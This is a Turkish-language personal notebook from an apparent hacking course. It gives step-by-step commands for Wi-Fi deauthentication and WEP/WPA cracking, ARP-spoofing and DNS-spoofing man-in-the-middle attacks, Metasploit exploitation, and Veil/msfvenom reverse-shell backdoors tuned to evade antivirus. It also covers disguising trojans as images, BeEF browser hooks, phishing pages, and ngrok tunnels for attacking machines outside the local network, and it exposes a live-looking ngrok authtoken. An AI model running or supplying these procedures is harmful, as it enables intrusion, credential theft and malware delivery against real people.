service netwok-manger restart ->ağ ayarlarını sıfırlar	
//cogu hacker cloudfare dns ini kullanır 1.1.1.1  1.0.0.1
//vpnn kullanırken firefoxa gir  about:config media.peercoonection.enabled ın value değeri false olmalıdır
nano /etc/dhcp/dhclient.conf  ->dhcp ayarlarını değiştirmek için kullanılır

cat /etc/resolv.conf          -> o anki kullanılan dns i görünütüler değişip değişmediğine burdan bakabilirsin
eğer dns i değiştiremediysen resolv.conf u değiştirmen gerekebilri.
leafpad bu text editör
resolv.conf u değiştirme -> cat /etc/resolv.conf   burdan dns i tekrar girip kaydedersen değiştirmiş olursun
dns yi ömürlük değiştirmek için   >>>>


root@KALILINUX:~# leafpad /etc/resolv.conf
root@KALILINUX:~# chattr -a /etc/resolv.conf
root@KALILINUX:~# lsattr /etc/resolv.conf
--------------e----- /etc/resolv.conf
root@KALILINUX:~# chattr -i /etc/resolv.conf
root@KALILINUX:~# leafpad /etc/resolv.conf
root@KALILINUX:~# chattr +i /etc/resolv.conf
root@KALILINUX:~# cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 8.8.8.8, 8.8.4.4root@KALILINUX:~# 

dnsleaktest dns de sızıntı var mı onun testini yapar ne kadar anonimsin yani 



nat network te kalinin internetini ana makineden alıyoruz



TOR BROWSER KODLARI 


root@KALILINUX:~# cd Downloads/
root@KALILINUX:~/Downloads# ls
jdk-8u111-nb-8_2-linux-x64.sh        VPNBook.com-OpenVPN-US1.zip  vpnbook-us1-udp25000.ovpn
opera-stable_67.0.3575.97_amd64.deb  vpnbook-us1-tcp443.ovpn      vpnbook-us1-udp53.ovpn
tor-browser_en-US                    vpnbook-us1-tcp80.ovpn
root@KALILINUX:~/Downloads# cd tor-browser_en-US/
root@KALILINUX:~/Downloads/tor-browser_en-US# ls
Browser  start-tor-browser.desktop
root@KALILINUX:~/Downloads/tor-browser_en-US# ./start-tor-browser.desktop
Launching './Browser/start-tor-browser --detach'...
./Browser/start-tor-browser: line 37: [: : integer expression expected
./Browser/start-tor-browser: line 54: zenity: command not found
./Browser/start-tor-browser: line 62: kdialog: command not found
root@KALILINUX:~/Downloads/tor-browser_en-US# ./start-tor-browser.desktop
Launching './Browser/start-tor-browser --detach'...
root@KALILINUX:~/Downloads/tor-browser_en-US# 


KENDİ KODUNDA ROOTLA ALAKALI BÖLÜMÜ HER ZAMAN SİLMEN GEREKİYOR

--------------------------------------------------------------
Alfa AWUSO36NH high gain usb  wireless G/N Long rang wifi netwok adapter
monitor mode    ->wifi kartımızı etrafımızdaki tüm bilgi akışını görebileceğimiz hale getirmek. 
packet injectin ->gerektiğinde bilgi yollayıp bilgi akışı yani trafik yaratabileceğimiz bir yöntem
Bu ikisini yukardaki wifi kartı sağlar bu tip wifi kartı kullanmak gerekir.
https://www.wirelesssistem.net/urun/alfanetwork-alfa-awus036nh
--------------------------------------------------------------
Kalinin ayarlarında ports > usb port > enable usb controller>usb lerden herhangi birini seç
altta cihaz çıkması görünmesi lazım
Network>>biridged adapter > OK //yani nat networkden çıkacağız > SOnra makineyi aç
--------------------------------------------------------------
Makineyi aaçtıktan sonra adaptörün görünüp görünmediğine bakmamız gerekiyor
Devices > USB > USB Cİahzı seç >SOnra kablosuz ağa bağlan
Bağlandıktan sonra varmı yok mu ping at
--------------------------------------------------------------
MAC Media access Control
ifconfig > ether ilebaşlayan yer ma adresi
mac adresi istenildiği gibi değiştirebilir
--------------------------------------------------------------
MAC ADRESİ DEĞİŞTİRME
>ifconfig
>ifconfig eth0 down
>macchanger --help
>macchanger --random eth0
>ifconfig eth0 up
>ifconfig    // to see new macc
--------------------------------------------------------------
MONİTOR MODA GEÇMEK
>airmon-ng start eth0
>ifconfig den interface ismine bak
>iwconfig eth0mon
>//durdurmak için  >airmon-ng stop eth0mon

MONİTOR MODA GEÇMEK DİĞER YÖNTEM
>ifconfig eth0 down
>iwconfig eth0 mode monitor
>ifconfig eth0 up
>iwconfig eth0 

MONİTOR MODDAN ÇIKMAK
>ifconfig eth0 down
>iwconfig eth0 mode managed
>ifconfig eth0 up
>iwconfig eth0
--------------------------------------------------------------
WİRELESS KARTI KULLANMAK İÇİN MONİTOR MODDA OLMAMIZ LAZIM SUAN

>airodump-ng eth0mon
  
  BSSID > mac adresi 
  PWR >uzaklığı belirtir
  #Data 
--------------------------------------------------------------
BELLİ BİR AĞA ÖZEL BİLGİ EDİNMEK
>airodump-ng -channel 9 --bssid 20:F3:A3:B6:32:3C --write test1 	eth0mon
  Bu yukardaki örnek uygulama rakamlara bak               dosyaya yaz	interfaace adı
  Ağa bağlı cihazları bu şekilde görebilirsin
>ls test1*
>cat test1-01.cap
--------------------------------------------------------------
DEAUTHHENTİCATİIN ATTACK//KULLANICIYI AĞDAN ATMA SALDIRISI

>airodump-ng --channel 9 --bsid 20:F3:A3:B6:32:3C eth0mon
//kendimize önce hedef seçiyoruz
>aireplay-ng --deauth 1000         -a 20:F3:A3:B6:32:3C  -c 2C:F0:EE:1A:BE:96   eth0
		      paket sayısı   bssid                  mac adresi/station  interface
//DDOS SALDIRISI GİBİ YANİ
--------------------------------------------------------------
CANLI DEAUTH SALDIRISI

>airodump-ng --channel 9 --bsid 20:F3:A3:B6:32:3C eth0mon
				diğerlerini dene
--------------------------------------------------------------
ENCRYPTION

WEB       KOLAY 
WPA/WPA2  ZOR

WEB CRACKİNG

>ifconfig
>airmon-ng start eth0
>iwconfig
>airodump-ng eth0mon
controlc 
>airodump-ng --bssid 20:F3:A3:B6:32:3C --channel 9 --write wepcrac   eth0mon
							   file name
--new terminal open
>aircrack-ng wepcrac01.cap
//bu şekilde ağ şifresi bulunur 
[ A1:B2:C3:D4:E5 ]  >>  A1B2C3D4E5

--------------------------------------------------------------
FAKE AUTHENTICATION SAHTE YETKİLENDİRME 

>airmon-ng start eth0
>iwconfig
//monitor moda geçildi
>airodump-ng eth0mon
//bi tane ağ belirle 
>airodump-ng --bssid 20:F3:A3:B6:32:3C --channel 9 --write fakeauth eth0mon
 							   file name
//open new terminal
>aireplay-ng --fakeauth 0         -a 20:F3:A3:B6:32:3C -h kendi macin eth0mon
			 yollanacak   bssid
			 paket 
			 sayısı
//authentication successfull demesi lazım
//>ip addr     komutu ile mac adresini öğrenebilirsin
//authentication gerçekleşti şimdi packet injection yapacağız
>airodump-ng --arpreplay -b 20:F3:A3:B6:32:3C -h mac adresin eth0mon
//fake authetication bozulduysa tekrar dene 

//aircrack yapacaz

>aircrac-ng arpreplay-01.cap
// en sonda bittiğnde key found demesi lazım
//PACKET İNJECTİON İLE WEP ŞİFRESİ KIRMA 

--------------------------------------------------------------
WPA CRACKING

HANDSHAKE 
WORDLIST 

>airmon-ng start eth0  //bizi monitör moda alıyordu
>iwconfig              //interface adı değişmiş olması lazım
>airodump-ng wlan0mon
>airodump-ng --bssid [hedefin bssid si] --channel - --write handshakefile eth0mon

//şifreyi bilen biri bağlanırken handshake yakalanabilir veya deauthentication

>aireplay-ng --deauth 5 -a hedefbssid -c hedef mac adresi eth0mon


--------------------------------------------------------------
WORDLİST YARATMAK

CRUNCH
//YUKARININ DEVAMI
>crunch
>crunch 8 9  xy123 -o testwordlist   //min 8 max 9 şifre en sağdaki karakterlerden oluşsun demek
>ls
>cat testwordlist
> // handshake ile oluşturulan şifreleri eşleştirmek gerek
>aircrac-ng handshake-file01.cap -w testwordlist
--------------------------------------------------------------
DAHA GÜVENLİ AĞ

GOOGLE > 192.168.1.1 //admin arayüzü
Kanal 9 da kullanabilirsin
maximum kaç cihaz bağlanabilir
WPS ETKİN YAPMA 
ŞİFRELEME WPA2 PSK
--------------------------------------------------------------
MAN IN THE MIDDLE 
AĞ İÇİ SALDIRILAR 

>netdiscover  --help 
//ARP Address resolution protocol
nmap 
--------------------------------------------------------------
hedef cihazıma diyeceğim ki benim mac adresim modemin mac adresiyle aynı
yani bak kardeşim ben modemim
modeme de diyeceğim ki bak kardeşim ben cihazım hedef cihazım
yani kendimi ortaya konumlatacağım 
aynı ağda olduğumuzda daha kolay

arp isteği almadan arp cevabı gönderme hakkımız var açık bu 
modeme kendimizi cihaz cihaza da kendimizi modem olarak tanıtabiliriz


kali makinesinin ip si => 192.168.202.132
Wİndows ip si	       => 192.168.1.103		 


windows cmd de kendi arp -a da kendi ip adresinin olduğu interface de
ilk sıradaki dinamik ip modemin ip adresi, karşısında da modemin mac
adresi var

windows arp -a 
modem ip si 
192.168.1.1 mac adresi 5c-63-bf-5c-98-e7


atıl hoca
kali ip 10.0.2.15
windos  10.0.2.4

windos -a 
modem ip si 10.0.2.1 mac 52-54-00-12-35-00 tipi dinamik olana bakacaksın


arpspoof -i eth0   -t 10.0.2.4 10.0.2.1
	    arayüz    target   modemin adresi
target a ben modemim diyoruz


yeni terminalde
arpspoof -i eth0   -t 10.0.2.1 10.0.2.4


windows makineye gel > arp -a
windows ip sinin olduğu tabloda modemin ip sinin olduğu satırda
mac adresinin değişmiş olması lazım
kaliyle modemin mac adresinin aynı olması lazım windows ip sini olduğu interface de 

yeni terminal aç
ipforwarding yapmamız lazım
bunu yapmazsak hedef bilgisayarın interneti çöker giremez

>echo 1 > /proc/sys/net/ipvt/ip_forward
man in the middle olduk

mitmf indir 

>cd  Downloads/
>cd MITMf-master/
>python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4
					modemadresi		   windows ip


hata alıyosan kütüphaneleri falan yükle 

windows cmd de windows ipsinin olduğu inreface de 2 tane aynı mac adresine sahip ip olması lazım

her mitmf denemsinde browser de geçmişi temizle 


http sitelerinde veriler şifrelenmez hackerlar bu verileri görebilir

mitmf de giden gelen dataların gözükmesi lazım 

mitm framework https sitelerde sslstrip diye bişey devreye giriyor 
https den http ye downgraded yapmaya çalışıyor

mitm frawework hsts sitelerde kilitleniyor



-----------------------------------------------------------
Wi-Fi Lock Sayfasına Yönlenirseniz

Biraz sonra izleyeceğiniz derste kendi web-server'ınızı açtığınızda index'i değiştirmenize rağmen içinde Wi-Fi Lock yazan bir sayfaya yönlenirseniz şu adımları yapmanız gerekiyor:

Bu mana-toolkit yüzünden kaynaklanan bir durum. O sebeple önce onu silmemiz gerekiyor:

apt-get remove mana-toolkit 

Sonrasında dosyalardan açıp ilerleyip şu klasörü bulmamız gerekiyor:

/etc/apache2/sites-enabled 

Bu klasörü bulduktan sonra içindeki herşeyi silip şu komutu çalıştırabiliriz 

cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/ 

service apache2 restart 

Bundan sonra hem Kali'deki Firefox'ta hem de daha önce denendiyse Windows'ta history'i ve cache'i temizleyerek tekrar deneyebilirsiniz.
-----------------------------------------------------------
DNS SALDIRISI
mitm
dns nedir ? isimle ip adresini birleştiren yapı 
mesela google a giren kişileri başka yere yönledirebiliriz

google a giren adamı kendi servera yönlendricem


kişileri kendi web siteme yönlendirip bak seni hackledim diyebilrim 
>service apache2 start
apache2 bir sunucu 
bütün linux sistemlerinde web siteleri bir yere kaydedilir

home klasöründe var dosyası altında html dosyasını buluyorum orda indeksli dosyayı bulup açıp içini siliyorum
var/www/html/index.html bu dosyaı aşağıdaki şekliyle değiştiriyoruz
<h1> I hack you yazıyoruz </h1>

DOwwnloads kalsöründe MITM-faster dosyasında config i buluyorum onun altında mitm.conf dosyasını buluyorum
dosyayı herhangi bi araçla açıyorum
dosyanın içinde DNS dns bölümü var oraya geliyorum
DNS bölümünde A lı bi kısım var sitelerin yönlendirildiği bölüm oraya herhangi bir siteyi kendi ip me eşitliyorum

>cd Downloads/
>cd MITMf-master/
>python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 target 10.0.2.4 --dns
						 modem ip        windows ip 
index atmak?
----------------------------------------------------------
BETTERCAP KULLANIMI

>bettercap -iface eth0
	   interface
>help    //nasıl kullanılıdığını modülleri tek tek anlatıyor
>help net.probe
>net.probe on
>net.show //netdiscover olarak düşün

┌─────────────────┬───────────────────┬─────────────────┬──────────────┬───────┬───────┬──────────┐
│      IP ▴       │        MAC        │      Name       │    Vendor    │ Sent  │ Recvd │   Seen   │
├─────────────────┼───────────────────┼─────────────────┼──────────────┼───────┼───────┼──────────┤
│ 192.168.202.132 │ 00:0c:29:ee:86:71 │ eth0            │ VMware, Inc. │ 0 B   │ 0 B   │ 20:29:00 │
│ 192.168.202.2   │ 00:50:56:f5:60:aa │ gateway         │ VMware, Inc. │ 0 B   │ 0 B   │ 20:29:00 │
│                 │                   │                 │              │       │       │          │
│ 192.168.202.1   │ 00:50:56:c0:00:08 │ LAPTOP-DDQCR12L │ VMware, Inc. │ 67 kB │ 57 kB │ 20:59:34 │
│ 192.168.202.254 │ 00:50:56:f1:d5:c6 │                 │ VMware, Inc. │ 684 B │ 20 kB │ 20:58:20 │
└─────────────────┴───────────────────┴─────────────────┴──────────────┴───────┴───────┴──────────┘
eth0 kalinin ip si
gateway in olduğu sıra modem
en alttaki windows ?

>   //arp.ban on deauthentication saldırısıyla aynı şey internetten koparma yani

>set arp.spoof.fullduplex true
>set arp.spoof.targets 192.168.202.254
>arp.spoof on
>net.sniff on 
----------------------------------------------------------








>bettercap -iface eth0
>net.probe on 
>net.show 
>set arp.spoof.fullduplex true 
>set arp.spoof.targets target ip 
>arp.spoof on 
>net.sniff on 

https siteleri http ye indirmede bettercap suan basarısız fakat 
biz bunu değiştiricez

hsts > http downgrade 

┌─────────────────┬───────────────────┬─────────────────┬──────────────┬────────┬───────┬──────────┐
│      IP ▴       │        MAC        │      Name       │    Vendor    │  Sent  │ Recvd │   Seen   │
├─────────────────┼───────────────────┼─────────────────┼──────────────┼────────┼───────┼──────────┤
│ 192.168.202.133 │ 22:5b:88:7e:9a:1c │ eth0            │              │ 0 B    │ 0 B   │ 21:45:29 │
│ 192.168.202.2   │ 00:50:56:f5:60:aa │ gateway         │ VMware, Inc. │ 0 B    │ 0 B   │ 21:45:29 │
│                 │                   │                 │              │        │       │          │
│ 192.168.202.1   │ 00:50:56:c0:00:08 │ LAPTOP-DDQCR12L │ VMware, Inc. │ 1.1 kB │ 319 B │ 21:45:43 │
│ 192.168.202.254 │ 00:50:56:f1:d5:c6 │                 │ VMware, Inc. │ 0 B    │ 92 B  │ 21:45:42 │
└─────────────────┴───────────────────┴─────────────────┴──────────────┴────────┴───────┴──────────┘
192.168.1.24    96:83:7b:5d:ac:29      8     336  Unknown vendor                                                                                                   
192.168.1.240   96:83:7b:5d:ac:29      7     294  Unknown vendor 
windows 192.168.1.103

>bettercap -iface eth0
>net.probe on 
>net.show
>set arp.spoof.fullduplex true 
>set arp.spoof.targets ip
>arp.spoof on 
>net.sniff on 
>hstshijack/hstshijack 
---------------------------------------------------------------
js injection
>//boş bi txt doyası aç 
>//içine şunu yaz
alert{'I hack you'};
save to root as burak.js
yandaki dosyaya /usr/share/bettercap/caplets/hstshijack# leafpad hstshijack.cap
burak.js i ekle payloads kısmına
>bettercap -iface eth0
>net.probe on 
>set arp.spoof.fullduplex true
>set arp.spoof.targets ip
>arp.spoof on
>hstshijack/hstshijack
---------------------------------------------------------------
wireshark ile ortadi adam olma 

modemin mac adresi ile kali linux un mac adresinin aynı olması lazım

http kullanıcı adı ve şifrenin protokolü post metoduyla yapılır genelde
kullanıcı adını post metodunu aratarak wiresharkta bulabilirsin

wireshark örnek paket arama şekli

Packet details Narrow&Wide String username 

-----------------------------------------------------------------
mitm saldırısından korunmak için arp yağmuruna tutulup tutulmadığımızı bilmek gerek 
wireshark bunun alarmını verir, şu şekilde

wireshark > edit > preferences  > advanced > search > arp > arp.detect_request_storm TRUE olması gerek

-----------------------------------------------------------------
ZENMAP KURULUMU
nmap sitesinden zenmapi indir > zenmap-7.80-1.noarch.rpm
>apt-get install alien dpkg-dev debhelper build-essential
>cd Downloads/
>alien zenmap-7.80-1.noarch.rpm
>ls
>dpkg -i zenmap_7-80_all.deb
>zenmap
-----------------------------------------------------------------
METASPOLİTABLE MAKİNESİ ELE GEÇİRME - vsftpd_234_backdoor

>nmap -sV -T4 -O -F --version-light 192.168.202.149
//ağ tarama sonucuna göre açıkları falan görüyoruz
//21/tcp   open  ftp         vsftpd 2.3.4
//>google > vsftpd 2.3.4 exploit >  module options
//module options kısmında kullanımı var

>msfconsole
>use exploit/unix/ftp/vsftpd_234_backdoor
>show options
>set RHOSTS  192.168.202.149
>set RPORT 21
>show options
>exploit
//RPORT zaten 21 olması lazım nmap taramasında, eğer farklıysa optionsdaki gibi yaparsın
------------------------------------------------------------------ 
METASPLOİTABLE MAKİNESİ ELE GEÇİRME -Samba smbd 3.X - 4.X
//kullanıcı adı açığı
//sonra bu modüllerin exploitlerin kodlarını incele 
//atıl samancıoğlu youtube 

//google > Samba smbd 3.X - 4.X exploit
>msfconsole
>use exploit/multi/samba/usermap_script
>show options
>set RHOSTS 192.168.202.149
>exploit
------------------------------------------------------------------
METASPLOİTABLE MAKİNESİ VERİ TABANI AÇIĞINI KULLANMAK

>msfconsole
> use exploit/linux/postgres/postgres_payload
> show options
> set RHOSTS 192.168.202.149
> exploit

------------------------------------------------------------------
KULLANICILARA SALDIRMAK
VEİL FRAMEWORK
//kullanıcılara saldırmak için kullanılan bir araç trojan oluşturmak için

VEil yükleme
----------------------------------
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
----------------------------------

veil başlatma 
>cd opt
>cd Veil
>python3 Veil.py
------------------------------------------------------------------
reverse http ?
karşı tarafın senin bilgisayarına bağlanması demek
daha güvenli bir session açmak için kullanılır
-->ruby/meterpreter/rev_http.py
------------------------------------------------------------------
Veil ile backdoor oluşturmak

root klasörüne gel

>cd opt
>cd Veil
>ls
>python3 Veil.py
>list
>use 1   //Evasion yani, diğeri Ordnance
>list
>use 14
>set LHOST 192.168.202.147   //kendi ip numaran
>set LPORT 8080              //fazla kullanılmayan bir port seç ki çakışma olmasın

----
>set PROCESSORS 1
>set SLEEP 4
>generate 
>buraknew_payload // oluşturduğun bacdoor un ismi
----

// yukardaki ayarları antivirüsleri atlatmak için yazıyoruz
//oluşturulan backdooru ilgili klasöre git test et antivirüslerin kaç tanesini geçiyor veya geçemiyor
//>google > online virus scanner without result distribution> dosya
-----------------------------------------------------------------
MULTİ HANDLER KULLANIMI

multi handler gelen bağlantıları yönetmemizi sağlar

>service apache2 start // BU senin makineni erişilebilir kılıyor.
>// oluşturduğun backdoor u var/www/html/backdoors içersine koy
>//backdoors dosyası senin kendi oluşturduğun dosya
>//backdoor içindeki oluşturduğun trojan dosyası windos makinesinde çalıştırılmış olmalı
>>msfconsole
>>use exploit/multi/handler
>>show options
>>set PAYLOAD windows/meterpreter/reverse_http
>>show options
>>set LHOST 192.168.202.147 // kali makinesinin ip si
>>show options 
>set LPORT 8080
>exploit

//dosya kopyalamayı manuel değil komutla öğren !
-----------------------------------------------------------------
SOSYAL MUHENDİSLİK


BACKDOOR U jGEP OLARAK GÖSTERMEK

Öncelikle bi tane görsel bul kaydet

türkçe klavye > setxkbmaptr

icon yapmamız lazım
görselden icon yapma olayı
google > create ico from jpeg online 
icoyu kaydet .ico uzantılı olmalı 

foto ve ico dosyalarını /var/htnl/backdorrbackdoor klasörüne koy

------
şimdi backdoor oluşturmamız 
------
>cd /opt
>ls
>cd Veil
>ls
>python3 Veil.py
>use 1
>list
>use 7  //(c/meterpreter/rev_tcp.py)
>set LHOST 192.168.202.147
>generate  

//var/lib/veil/output/source/image_backdoor.c    dosya buraya kaydedildi
//bu dosyayı al /var/www/html/backdoors içine koy
((resim ico ve backdoor aynı klasörde olmalı 


https://www.autoitscript.com/site/autoit/downloads/  bu siteden autoit indir 
//wwwine komutu exe dosyalarını çalıştırmayı sağlar

>cd Downloads
>wine autoit-v3-setup.exe
>cd /opt
>git clone https://github.com/atilsamancioglu/TrojanFactory.git
>cd TrojanFactory/
>ls
-----

python3 trojan_factory.py -f http://192.168.202.147/backdoors/coni.jpg -e 192.168.202.147/backdoors/conireis.exe -o /opt/TrojanFactory/coniabi.exe -i http://192.168.202.147/backdoors/coni.ico

                          -f jpeg dosyası			       -e evil yani oluşturulan backdoor 	 -o yeni backdoor		   -i ico dosyası 

tam olşturamayacak o yüzden /TrojanFactory deki generic iconu bizim ico ile değiştir sonra oluşturulan backdoor u /backdoor klasörünün içine at
-----
>service apache2 start
>yeni terminalde > msfconsole 
>use exploit/multi/handler 
>set payload windos/meterpreter/reverse_tcp
>show options 
>set LHOST 192.168.202.147 // KALİ İP Sİ
>exploit -j -z



-------------------------------------------------------------

emaillleri değiştirmek 

>google > send anonymous email sender 


-------------------------------------------------------------
uzantıları değiştirmek 


apt-get install gnome characters.


arama çubuğundan characters yaz uygulamayı aç 
right to left override yaz aç 
-------------------------------------------------------------
BEEF (BROWSER EXPLOİTATION FRAMEWORK)

Amaç hedef bilgisayara hook kodunu çalıştırmak

Beef eğer yüklü değilse 

>cd ..
>cd opt
>git clone https://github.com/beefproject/beef.git
>cd beef
>ls
	 //install dosyasını 1 defaya mahsus çalıştırmamız gerekiyor
>./install
>./beef
	 //ilk açışımızda username ve passwordu değiştirmemizi söyleyecek

leafpad confi.yaml
	 //username ve passwordu ordan ayarla şimdi tekrardan çalıştırabilirsin
	 //otomatik olarak browser ı açması lazım açmazsa sen aç>http://127.0.0.1:3000/ui/panel

---------------------------------------------------------------------------------
BAŞLAYALIM

WEB SİTESİNE HOOK KODUNU KOYMAMIZ LAZIM

>service apache2 start    
	 //kali ip si 192.168.202.147
>/var/www/html
>ls
>leafpad index.html
	// <script src="http://192.168.202.147:3000/hook.js"></script> dosyanın içine bunu koyup kaydetip çık
//windows makinesinde > 192.168.202.147/ bu adrese gittiğin zaman windows kalinin oltasına takılmış oluyor beefe düşüyor

>bettercap -iface eth0
//beefcustom ı indirdikten sonra /usr/share/bettercap/caplets/ konumuna koy
//cap dosyasında target ip sini windows vereceksin js dosyasında hook kodundaki ipye kalinin ip sini vereceksin

>exit
baştan alalım
bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap
//windows makinesinde 192.168.202.147 ye gittiğin zaman takılmış olacak ama başka siteye geçtiğin zaman beefteki
commandler çalışmıyor bunun nedenini öğren sadece ipyi girdiği nzaman çalışıyor
 
commandlerde spydereye ss almanı sağlar 
	     prettythieft facebook sessionı açtırmayı sağlar 
----------------------------
BEEF İLE BACKDOOR İLETMEK 

beef işlerini halletikten sonra fake notification bar (chrome) command ini çalıştırdıktan sonra URL ye senin 
oluşturduğun backdoor un adresini vermen gerekiyor > http://192.168.202.147/backdoors/intall_plugins.exe gibi

yeni terminal aç 
>cd ..
>cd opt 
>cd Veil
>ls
>python3 Veil.py
>use 1
>list
>use 14 (go/meterpreter/rev_http.py)
>set LHOST 192.168.202.147 (kali ip si)
>set LPORT 5050
>set PROCESSORS 3
>set SLEEP 3
>generate 
>payload name :  install_plugins
//şu konuma kaydoldu /var/lib/veil/output/compiled/intall_plugins.exe
exit
>mv /var/lib/veil/output/compiled/intall_pulggggg.exe /var/www/html/backdoors/
>cd  /var/www/html/backdoors/
>ls
>service apache2 start
>msfconsole
>use exploit/multi/handler
>set payload windows/meterpreter/reverse_http
>set LHOST 192.168.202.147 (kali ip si)
>set LPORT 5050
>exploit
//meterpreter sessionı açılmış olması lazım

---------------------------------------------------------------------------------
SOSYAL MEDYA GÜVENLİĞİ 
brute force taktiği şimdilik çalışmıyor
oltalama taktiği kullanacağız

kullanacağımız script kendi serverımızda çalışmıyor bu yüzden web sitesine ihtiyacımız var 
wen sitesi kurma işlemleri paralı olduğu için 


000webhost.com dan ücretsiz hoat ayarlayabilirsin
ordan 2 dosyayı yüklüyorsun sonra o linke tıklıyosun kendi web adresini sonundakini silip /paswword.html
yazarsan şifreler kullanıcı adı falan geliyor
dosyalr masaüstünde
---------------------------------------------------------------------------------
OUTSIDE NETWORK
	PORT FORWARDING
	TUNNELING
TUNNELING SENIN IP NI GİZLEMENİ SAĞLAR DAHA SONRA AYRINTILI ARAŞTIRIP BURDAKİ NOTU GÜNCELLE 


			 _________________
	        	|                 |
	                |     ROUTER      |
		        |    PUBLIC IP    |
	                |_________________|
	      	      /                     \
	     	     /                       \
	            /                         \
      	      CONNECTION                  CONNECTION
		  /	                        \
		 /                               \
		/ 				  \
	VICTIM /				   \ HACKER




	                 _________________
	        	|TUNNELING SERVICE|
	                |     [NGROK]     |
		        |    TUNNEL IP    |
	                |_________________|
	      	      /                     \
	     	     /                       \
	            /                         \
      	      CONNECTION                  CONNECTION
		  /	                        \
		 /                               \
		/ 				  \
	VICTIM /				   \ HACKER



TUNNELING DE PUBLIC IP MİZİ VERMİYORUZ


İŞLEMLERİ NGROK İLE YAPACAĞIZ. SERVEO DA İYİDİR
NGROK SAYESİNDE KENDİ SUNUCUMUZU İNTERNETE AÇABİLİYORUZ

kendi web serverımızı açmak için  > ngrok http 80

-------------------------------------------------------------------------------------
>./ngrok authtoken 1hfFF5vdFN7QRr1KogYmXUqFu9b_6mpLmGF3BGw7DWFAGPx3f
>./ngrok tcp 4242
ngrok by @inconshreveable                                            (Ctrl+C to quit)
                                                                                       
Session Status                online                                                   
Account                       Tunahan Burak Dirlik (Plan: Free)                        
Version                       2.3.35                                                   
Region                        United States (us)                                       
Web Interface                 http://127.0.0.1:4040                                    
Forwarding                    tcp://2.tcp.ngrok.io:13361 -> localhost:4242             
                                                                                       
Connections                   ttl     opn     rt1     rt5     p50     p90              
                              0       0       0.00    0.00    0.00    0.00  
//servisin çalışması için bu termminali kapatmamam gerekiyor
-------------------------------------------------------------------------------------
| ---------------------------------------------------------------------------------  |
| |root@KALILINUX:~/Downloads# ./ngrok help					   | |
| |NAME:                                                                           | |
| |  ngrok - tunnel local ports to public URLs and inspect traffic		   | |
| |										   | |
| |DESCRIPTION:									   | |
| |    ngrok exposes local networked services behinds NATs and firewalls to the	   | |
| |    public internet over a secure tunnel. Share local websites, build/test	   | |
| |    webhook consumers and self-host personal services.                          | |
| |    Detailed help for each command is available with 'ngrok help <command>'.	   | |
| |    Open http://localhost:4040 for ngrok's web interface to inspect traffic.	   | |
| |										   | |
| |EXAMPLES:									   | |
| |    ngrok http 80                    # secure public URL for port 80 web server | |
| |    ngrok http -subdomain=baz 8080   # port 8080 available at baz.ngrok.io	   | |	
| |    ngrok http foo.dev:80            # tunnel to host:port instead of localhost | |
| |    ngrok http https://localhost     # expose a local https server		   | |
| |    ngrok tcp 22                     # tunnel arbitrary TCP traffic to port 22  | |
| |    ngrok tls -hostname=foo.com 443  # TLS traffic for foo.com to port 443	   | |
| |    ngrok start foo bar baz          # start tunnels from the configuration file| |
| |										   | |
| |VERSION:									   | |
| |   2.3.35									   | |
| |										   | |
| |AUTHOR:                                                                         | |
| |  inconshreveable - <alan@ngrok.com>						   | |
| |										   | |
| |COMMANDS:									   | |
| |   authtoken    save authtoken to configuration file				   | |
| |   credits      prints author and licensing information                         | |
| |   http         start an HTTP tunnel						   | |
| |   start        start tunnels by name from the configuration file		   | |
| |   tcp          start a TCP tunnel						   | |
| |   tls          start a TLS tunnel						   | |
| |   update       update ngrok to the latest version				   | |
| |   version      print the version string					   | |
| |   help         Shows a list of commands or help for one command		   | |
| ---------------------------------------------------------------------------------  |
-------------------------------------------------------------------------------------
			backdoor oluşturup dış ağda hedefi hacklemek 
yeni terminal açıp backdoor yapıcaz
veil yeni güncellemyele tünel servislerini kullandıtmıyor
bunu düzelticez kodları editleyip
msfvenom msfconsole gibi 
msfvenom windows makinalarda daha az yakalanıtor gibi 



>msfvenom -p windows/meterpreter/reverse_tcp -a x86       --platform windows lhost=2.tcp.ngrok.io lport=18084 -f exe    -o /root/Desktop/msfbackdoor.exe
           payload                            architeture   platform         ngrok                ngrok portı  filetype output
>mv /root/Desktop/msfbackdoor.exe /var/www/html/backdoors/
>cd  /var/www/html/backdoors/
>ls
>msfconsole 
>use exploit/multi/handler

>set PAYLOAD windows/meterpreter/reverse_tcp
>show options
>set LHOST 0.0.0.0
>set LPORT 4242  //ngroktaki localhost portu
>show options
>exploit -j -z
//bundan sonra hedef bilgisayarın dosyayı indirip çalıştırması gerekli 
>sessin -l
>session -1

-------------------------------------------------------------------------------------
şimdi veil ile yapacağız ngrok çalışmaya devam ediyor

>cd ..
>cd opt
>ls
>cd Veil/
>python3 Veil.py
>use 1
>list
>use 7
>set lhost 2.tcp.ngrok.io
//[!] ERROR: You did not provide a valid IP!  şeklinde hata verirse ki verecektir
>exit
>geany tool.py
//421. satıra git 2 tane alt alta if bloğu var en alttaki if in altındaki 3 satırı sil üstteki selected ksımını 
//eski if in hizasına getir kaydet çık
>cd /opt/Veil.py
>python3 Veil.py
>use 1
>list
>use 7
>set lhost 2.tcp.ngrok.io
>set lport 18084
>generate
> payloadname : veilnewbackdoor
>mv /var/lib/veil/output/source/veilbackdoor.exe  /var/www/html/backdoors/

>msfconsole 
>use exploit/multi/handler

>set PAYLOAD windows/meterpreter/reverse_tcp
>show options
>set LHOST 0.0.0.0
>set LPORT 4242  //ngroktaki localhost portu
>show options
>exploit -j -z
//bundan sonra hedef bilgisayarın dosyayı indirip çalıştırması gerekli 
>sessin -l
>session -1


//özet olarak backdoor oluştururken ngrok linkini porta da ngrok portunu veriyosun
//msfconsole a geçtiğinde lhost 0.0.0.0 lport a da ngrok (terminalde ./ngrok tcp 4242 çalıştırdığında çıkan ekrandaki) sayfasındaki localhost numarasını veriyosun.


-------------------------------------------------------------------------------------
şimdi windows farklı kali farklı bir ağda olsun yani ortak ağda olmayalım dış bir ağdan saldırı yapacağız
veya ağım dışındaki bir bilgisayara saldırı yapacağız da diyebiliriz.

PORT FORWARDİNG YAPARAK DIŞ AĞDAKİ BİLGİSAYARA SALDIRMA 


>cd opt
>ls
>cd Veil.py
>use 1
>//herhangi bir reverse http mesele 26
